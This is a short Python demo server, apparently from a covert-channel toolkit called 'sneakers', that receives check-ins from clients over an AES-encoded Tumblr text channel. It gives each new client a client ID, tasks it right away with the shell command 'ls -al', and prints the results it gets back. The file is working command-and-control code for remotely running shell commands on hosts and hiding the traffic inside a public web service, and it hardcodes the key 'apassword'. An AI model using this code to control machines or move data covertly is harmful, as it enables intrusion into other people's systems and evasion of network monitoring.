"""
A simple demo server.

It waits to receive connections from a client, then instructs that client to run `ls -al`, waits for the results, and prints them. Should work with multiple clients but honestly anything more than what I described above is untested.
"""

import json
import random
import string
from time import sleep

from sneakers import Exfil

mod = "tumblr_text"

with open('sneakers/config/{}_config.json'.format(mod), 'rb') as f:
    file_data = f.read()

params = json.loads(file_data)

enc = ['aes']

t = Exfil(mod, enc)

aes_params = {'key': 'apassword'}
t.set_encoder_params('aes', {'sending': aes_params, 'receiving': aes_params})
t.set_channel_params({'sending': params, 'receiving': params})

clients = {}

def make_fragment_id():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))

def make_client_id():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))

def get_client_for_fragment(packet):
    send_fragment = packet.split('|')[0]
    new_fragment = packet.split('|')[-1]
    client_id = filter(lambda c: clients[c]['current_fragment_id'] == send_fragment, clients)
    try:
        client_id = client_id[0]
    except IndexError:
        # no client found!
        return None

    # update the client with the new fragment id to use for them
    clients[client_id]['current_fragment_id'] = new_fragment
    # since we got something from the client, they are just waiting for us now
    # (therefore we are ready to send to them at any time)
    clients[client_id]['waiting'] = True
    return client_id

def send_packet_to_client(client_id, payload):
    """ Given a payload, wraps it in the proper fragment_id fields and sends
    it off """
    # update to note that we have sent to the client and it is no longer
    # just waiting around to get a packet - it has been tasked and is busy
    clients[client_id]['waiting'] = False
    fragment_id = clients[client_id]['current_fragment_id']
    new_fragment_id = make_fragment_id()
    clients[client_id]['current_fragment_id'] = new_fragment_id
    packet = '{}|{}|{}'.format(fragment_id, payload, new_fragment_id)
    t.send(packet)

def handle_packet(packet):
    tokens = packet.split('|')
    if tokens[1] == "connected":
        if tokens[0] in [clients[c]['initial_fragment_id'] for c in clients]:
            # we've already seen this one
            return
        print("New client connected!")
        client_id = make_client_id()
        clients[client_id] = {
            'initial_fragment_id': tokens[0],
            'current_fragment_id': tokens[-1],
            'waiting': True # is the client ready for a new packet?
        }

        # task the client right away
        send_packet_to_client(client_id, "shell|ls -al")

    # now check to see if we have a thread going; "connected" is a special case
    client_id = get_client_for_fragment(packet)
    if client_id is None:
        # no client found! ignore.
        return

    # now process our packet (since we know who it came from)
    if tokens[1] == "result":
        print("Got a result:")
        print(packet)


while True:
    for packet in t.receive():
        handle_packet(packet)
    print("Clients:")
    print(clients)
    print("")
    sleep(15)
